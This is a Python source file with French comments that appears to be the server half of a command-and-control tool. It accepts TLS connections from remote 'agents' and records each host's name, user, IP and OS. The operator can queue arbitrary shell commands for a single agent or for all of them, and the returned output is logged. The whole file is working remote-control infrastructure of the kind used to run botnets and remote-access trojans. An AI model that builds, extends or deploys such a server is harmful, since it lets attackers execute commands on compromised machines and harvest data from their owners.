import sys
import socket
import threading
import json  
import ssl
connected_clients = []  
pending_commands = {}  


# fonction qui écrit les données dans un fichier JSON
def write_to_json(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            json.dump(data, file, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"Erreur lors de l'écriture dans le fichier JSON : {e}")

# fonction qui regarde si le client existe déjà dans le fichier JSON, si oui il le met à jour, sinon il l'ajoute
def update_or_add_client(filename, client_info):
    try:
        try:
            with open(filename, "r", encoding="utf-8") as file:
                clients = json.load(file)
        except FileNotFoundError:
            clients = []  

        client_uid = client_info.get("uid")
        if not client_uid:
            print("uid manquant dans les informations du client.")
            return

        for client in clients:
            if client.get("uid") == client_uid:
                client.update(client_info)  
                break
        else:
            clients.append(client_info)

        write_to_json(filename, clients)
        print(f"Client avec UID {client_uid} mis à jour ou ajouté.")
    except Exception as e:
        print(f"Erreur lors de la mise à jour ou de l'ajout du client : {e}")

# fonction qui gère la connexion avec le client
def handle_client(client_socket):
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                print("Le client s'est déconnecté.")
                break
            try:
                decoded_data = data.decode()
                if decoded_data == "GET_COMMAND":
                    uid = None
                    for client in connected_clients:
                        if client["socket"] == client_socket:
                            uid = client["info"]["uid"]
                            break

                    if uid is None:
                        print("Impossible de trouver le client correspondant au socket.")
                        continue

                    # Vérifier s'il y a une commande en attente pour cet agent
                    command = pending_commands.pop(uid, None)
                    if command:
                        client_socket.send(command.encode())
                        print(f"Commande envoyée à l'agent {uid} : {command}")
                    else:
                        client_socket.send(b"NO_COMMAND")  
                        print(f"Aucune commande en attente pour l'agent {uid}.")
                elif decoded_data.startswith("{") and decoded_data.endswith("}"):
                    client_info = json.loads(decoded_data)
                    uid = client_info.get("uid", "N/A")
                    print(f"Informations de l'agent reçues : {client_info}")
                    
                    for i, client in enumerate(connected_clients):
                        if "info" in client and client["info"]["uid"] == uid:
                            connected_clients[i] = {"info": client_info, "socket": client_socket}  
                            break
                    else:
                        connected_clients.append({"info": client_info, "socket": client_socket})  
                    
                    update_or_add_client("clients.json", client_info)
                else:
                    uid = None
                    for client in connected_clients:
                        if client["socket"] == client_socket:
                            uid = client["info"]["uid"]
                            break

                    if uid is None:
                        print("Impossible de trouver le client correspondant au socket.")
                        continue

                    with open("command_results.txt", "a", encoding="utf-8") as file:
                        file.write(f"Résultat de la commande {command} depuis l'agent {uid} :\n{decoded_data}\n\n")
                    print(f"Résultat de la commande reçu depuis l'agent {uid} :\n{decoded_data}")
            except json.JSONDecodeError:
                print(f"Erreur de décodage des données : {data}")
    except Exception as e:
        print(f"Erreur lors de la réception des informations système : {e}")
    finally:
        print("Fermeture de la connexion avec le client.")


# fonction qui gère les commandes du serveur
def server_commands(server):
    while True:
        cmd = input()
        if cmd.strip().lower() == "exit":
            print("Fermeture du serveur")
            if server:
                server.close()
            sys.exit(0)
        elif cmd.strip().lower() == "list":
            print("Liste des agents connectés :")
            if connected_clients:
                for client in connected_clients:
                    client_info = client.get("info", {})
                    print("\n- UID :", client_info.get("uid", "N/A"))
                    print("  Hostname :", client_info.get("hostname", "N/A"))
                    print("  System :", client_info.get("system", "N/A"))
                    print("  Version :", client_info.get("version", "N/A"))
                    print("  User :", client_info.get("user", "N/A"))
                    print("  IP :", client_info.get("ip", "N/A"))
                    print("  Python Version :", client_info.get("python_version", "N/A"))
                    print("  Timestamp :", client_info.get("timestamp", "N/A"))
            else:
                print("Aucun agent connecté pour le moment.")
        elif cmd.strip().lower().startswith("cmd_all"):
            parts = cmd.split(" ", 1)
            if len(parts) < 2:
                print("Usage : cmd_all <commande>")
                continue
            command_to_execute = parts[1]
            
            for client in connected_clients:
                uid = client["info"]["uid"]
                pending_commands[uid] = command_to_execute
            print(f"Commande ajoutée pour tous les agents : {command_to_execute}")
        elif cmd.strip().lower().startswith("cmd"):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("Usage : cmd <uid> <commande>")
                continue
            uid, command_to_execute = parts[1], parts[2]
            
            pending_commands[uid] = command_to_execute
            print(f"Commande ajoutée pour l'agent {uid} : {command_to_execute}")


# fonction qui démarre le serveur avec ssl
def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Écoute sur {host}:{port}")

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    try:
        while True:
            try:
                client_socket, addr = server.accept()
                print(f"Connexion reçue de {addr[0]}:{addr[1]}")

                secure_client_socket = context.wrap_socket(client_socket, server_side=True)

                client_handler = threading.Thread(target=handle_client, args=(secure_client_socket,))
                client_handler.start()
            except OSError:
                break
    except KeyboardInterrupt:
        print("\nArrêt du serveur.")
    finally:
        server.close()
        sys.exit()

#fonction qui charge les clients en cas de redémarrage du serveur
def load_clients_from_json(filename):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            clients = json.load(file)
            print(f"Chargé {len(clients)} client(s) depuis {filename}.")
            for client in clients:
                print(client)
    except FileNotFoundError:
        print(f"Fichier {filename} introuvable. Aucun client chargé.")
    except json.JSONDecodeError:
        print(f"Erreur de lecture du fichier {filename}. Format JSON invalide.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage : python3 server.py host port")
        sys.exit(1)
    
    load_clients_from_json("clients.json")
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    server_thread = threading.Thread(target=start_server, args=(host, port))
    server_thread.daemon = True  
    server_thread.start()
    
    server_commands(None)
